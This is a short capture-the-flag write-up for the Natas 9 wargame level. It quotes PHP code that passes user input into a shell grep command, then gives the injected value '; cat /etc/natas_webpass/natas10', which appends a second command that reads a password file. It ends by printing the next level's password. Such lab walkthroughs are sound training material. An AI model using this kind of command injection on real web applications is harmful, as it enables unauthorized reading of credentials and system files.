# Natas 9

Link : http://natas9.natas.labs.overthewire.org/

Natas 9 screen :

<img src="imgs/natas9.PNG" alt="Natas9 screnn">


Natas 9 source code :


<img src="imgs/url_natas9.png" alt="url Natas9">

Where are going to use this part of the code to get the answer:

```php
if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
```
replacing $key with "; cat /etc/natas_webpass/natas10"

```php
if($key != "") {
    passthru("grep -i ; cat /etc/natas_webpass/natas10 dictionary.txt");
}
```
Then we get  

<img src="imgs/natas9_sol.png" alt="sol natas9">

So the password for Natas 10 is : nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu